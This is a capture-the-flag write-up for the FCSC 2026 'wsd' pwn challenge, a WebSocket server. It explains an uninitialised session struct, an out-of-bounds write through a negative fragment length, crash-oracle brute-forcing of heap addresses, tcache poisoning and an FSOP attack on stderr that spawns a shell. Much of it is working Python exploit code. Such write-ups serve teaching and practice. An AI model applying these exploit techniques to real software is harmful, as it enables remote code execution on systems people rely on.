+++
title = "FCSC 2026 | wsd"
+++

# [Pwn] wsd | FCSC 2026

- Level: ⭐⭐
- Solves: 8
- Description:
  > Vous avez adoré la trilogie HTTP, je vous présente alors wsd, c'est presque pareil, mais différent.
  > Récupérez le flag dans /app/flag.txt.
- Exploit: [exploit.py](https://transfer.0xb0tm4n.org/inline/uUkj8KnxAY/exploit.py)

---

- [1. TL;DR](#TLDR)
- [2. Full explanation](#full-explanation)
  - [2.1 The bug](#the-bug)
  - [2.2 OOB](#OOB)
  - [2.3 First leak](#first-leak)
  - [2.4 Second leak](#second-leak)
  - [2.5 RCE](#RCE)

## TLDR

- leak the heap and the libc
- tcache poisoning to get arb write primitive
- FSOP to gain a one-way shell and then cat the flag

## Full explanation

### The bug

The bug was well hidden and I ended up finding it by pure luck. The issue was that the function which allocate the session `ws_session_create` doesn't clear the malloc'ed chunk (an easy fix would have been to use calloc but we're not here to fix but to exploit that hehe):

```c
/* WebSocket session */
struct ws_session {
	enum ws_state     state;

	/* Fragmentation state */
	enum ws_opcode    frag_opcode; /* the opcode of the initial fragment */
	size_t            frag_len;    /* current length of the fragmented message */
	uint8_t          *frag_buf;    /* accumulated payload for fragments */
};

struct ws_session *ws_session_create(struct ws_client *client)
{
	struct ws_session *s;

	s = malloc(sizeof(*s));
	if (!s)
		return NULL;

	s->state  = WS_STATE_OPEN;

	return s;
}
```

The len of `ws_session` is 0x30 so we just have to allocate and then free a previous chunk of size 0x30 to control the struct. The only problem here is that we cannot put any value we want as all the previous controlled chunks that are being freed are populated by `strdup`, so this meant that the only valid values we could put into the struct were a negative len and a possible ptr.

### OOB

So using the fact that we can set frag_len to be a negative value we could exploit this code

```c
static int ws_handle_frame(struct ws_client *client, struct ws_frame *frame)
{
  struct ws_session *session = client->session;
  int fd = client->fd;

  [...]

  if (frame->opcode == WS_OP_TEXT || frame->opcode == WS_OP_BINARY) {
    [...]
  } else if (frame->opcode == WS_OP_CONTINUATION) {
    // Append payload to the fragmentation buffer

    // this is checking that payload_len is not negative but doesn't check frag_len value
    if (frame->payload_len > 0) {

        // so if we set a negative frag_len using the bug
        // frag_len will be equal to payload_len - frag_len
        size_t new_len = session->frag_len + frame->payload_len;
        if (new_len > WSD_MAX_FRAME_SIZE) {
        LOG_ERR("Fragmented message exceeds max size");
        ws_send_close(client, WS_CLOSE_TOO_BIG);
        return -1;
        }

        // now we can fully control the realloc
        uint8_t *tmp = realloc(session->frag_buf, new_len);
        if (!tmp) {
        LOG_ERR("Failed to reallocate fragmentation buffer");
        ws_send_close(client, WS_CLOSE_ABNORMAL);
        return -1;
        }

        // but more importantly we can use it to OOB write
        // here using a negative value for frag_len will allow us to write to
        // any session - idx we want (almost), so we can fully control the
        // heap chunk's metdata
        session->frag_buf = tmp;
        memcpy(session->frag_buf + session->frag_len, frame->payload, frame->payload_len);
        session->frag_len = new_len;
    }

    [...]

}
```

### First leak

So the first step to this exploit was to gain a heap leak, I could have done that using smart heap tricks but as I'm dumb I used the ~~fastest~~easiest path that is BRUTEFORCING THE WHOLE `frag_buf` ADDRESS USING AN ORACLE.

To do this the first thing I had to find was a good oracle that would let me test every bytes one by one. I went for this simple, yet effective, approach:

- overwrite one byte of the `frag_buf` by our test value using this code:

```py
def set_offset(idx):
    # allocate the chunk of size 0x30 that will be reused by `ws_session_create`
    payload = b"%s %s HTTP1.1\r\n" % (b"\xff" * 0x10 + p64(idx & ((1 << 64) - 1)), b"/")
    send(payload + b"\r\n")
    rln(2)

def ws_upgrade(extra_headers=""):
    payload  = "GET / HTTP1.1\r\n"
    payload += "Upgrade: Websocket\r\n"
    payload += "Sec-WebSocket-Key: BBBB\r\n"
    payload += "Sec-WebSocket-Version: 13\r\n"
    payload += extra_headers
    send(payload + "\r\n")
    rln(5)

def arb_write(idx, data):
    set_offset(idx)
    ws_upgrade()

    # this will write at idx and allocate a chunk of size 0x20 as
    # new_len = payload_len - idx
    # so here, new_len = 10 and the min chunk size is 0x20
    session = flat({
        0x0: data,
        -idx + 10: b"\x00",
    }, filler=b"\x00")
    ws_send(Op.CONTINUATION, session, fin=False)
```

then we could exploit the other part of `OP_CONTINUATION` code:

```c
static int ws_handle_frame(struct ws_client *client, struct ws_frame *frame)
{
  struct ws_session *session = client->session;
  int fd = client->fd;

  [...]

  if (frame->opcode == WS_OP_TEXT || frame->opcode == WS_OP_BINARY) {
    [...]
  } else if (frame->opcode == WS_OP_CONTINUATION) {

    [...]

  	if (frame->fin) {
			// End of fragmented message, echo back the fully assembled buffer
			// TODO: Implement actually useful logic here
			LOG_DBG("Echo fragmented frame (%zu bytes assembled, fd=%d)",
				session->frag_len, fd);

			int ret = ws_send_frame(client, session->frag_opcode,
						session->frag_buf, session->frag_len);

			// Clean up fragmentation state
			free(session->frag_buf);
			session->frag_buf = NULL;
			session->frag_len = 0;

			return ret;
		}
}
```

here the `ws_send_frame` will return the frag_buf, so if the pointer is invalid it will SEGFAULT and return nothing, but if it's valid I will get a response and, thus, know that the byte I just tested is good.

so this was the full leak code:

```py
def leak_heap_byte(heap_partial, byte_offset):
    for j in tqdm(range(0x100)):
        candidate = (heap_partial << 8) | j
        arb_write(-0xd8 + byte_offset, candidate)
        ws_send(Op.CONTINUATION, b"", fin=True)
        try:
            ws_recv()
            reconnect(enable_log=False)
            return candidate
        except:
            reconnect(enable_log=False)

def exploit(ctx: PwnContext, ioctx: IOContext):
    libc = ctx.libc

    heap = 0
    libc.address = 0

    if not heap:
        info('leaking heap')
        for i in range(5, -1, -1):
            heap = leak_heap_byte(heap, i)

    [...]
```

### Second leak

So now we could use our newly found addresse to leak some stuff on the heap, like fd/bk ptr from an unsorted bin freed chunk.

To do so I've allocated a lot of stuff using 10 PING that would merge into a big chunk:

```py
    for _ in range(10):
        ws_send(Op.PING, b"A" * 0x10)
        ws_recv()
```

And then a little read:

```py
    session = flat({
        0x0: target,
        -idx + 10: b"\x00",
    }, filler=b"\x00")
    ws_send(Op.CONTINUATION, session, fin=False)

    data = arb_read()
    addr = u64(data[:8]) - 0x1e7130
    reconnect(enable_log=False)
```

BUT, btw this isn't the end of our bf journey, here too we need to bf a bit to find the correct chunk's address, and that would also help me to clean up the heap leak like this:

```py
    if not libc.address:
        info('leaking libc')
        for off in range(0x1000, 0x5000, 0x1000):
            addr = leak_libc(heap, off)
            if addr:
                libc.address = addr
                heap += off - 0x3000
                printx(libc=libc.address, heap=heap)
                break
```

### RCE

Now we have all we need to get our flag, to do so I used a tcache poisoning attack to overwrite stderr and perform a FSOP with this command: `/bin/sh <&4` that allows me to gain a write-only shell.

So to actually get the arb write onto the stderr struct I use the tcache poisoning to overwrite the `client-buf` ptr and thus allow me to write into stderr.

```py
        # allocate the victim chunk
        ws_send(Op.PONG, b"A" * 0x20)

        # + i is here to bf (yay) the tcache alignment
        # I don't really understand what's happening here
        # but it seems that when writing the target I would
        # get a random + or - value that broke the tcache
        # alignment and trigger a SIGABRT
        target = heap + 0x2a0 + i # client struct addr

        # safelinking key
        key = heap >> 12
        poison = flat({
            0x00: target ^ key, # victim chunk's fd
            0x18: 0x21, # size
            0x20: key,
            0x38: 0x41,
            0x40: key,
            -idx + 0x28: b"\x00",
        }, filler=b"\x00")
        sleep(0.5)
        ws_send(Op.CONTINUATION, poison, fin=True)

        # and then I'm using op.TEXT with fin=False to get a double malloc
        # so the 2nd malloc give me my target ptr which is the client struct
        client = flat(0x4, libc.sym._IO_2_1_stderr_, heap + 0x24e0)
        ws_send(Op.TEXT, client, fin=False)
```

And now everything is ready for our final step, the FSOP:

```py
        # fsopsh is a function from https://github.com/Super-Botman/pwninit.py
        # it generate a file struct that allow me to call system(arg)
        stderr = fsopsh(file=libc.sym._IO_2_1_stderr_, arg=b"/bin/sh <&4\x00")
        stderr = stderr[:0x70] + p64(0x4) + stderr[0x78:]
        sl(stderr)
        recv(0x2b)
        sleep(1) # weird buffering things happening
        sl("cat flag.txt >&4")
        return rl().decode()[:-1]
```

So here instead of using dup stuff I just used a little bash trick that allowed me to redirect the fd 4 (our socket fd) into the stdin of sh and then I redirect the stdout of cat into our fd again to get the flag
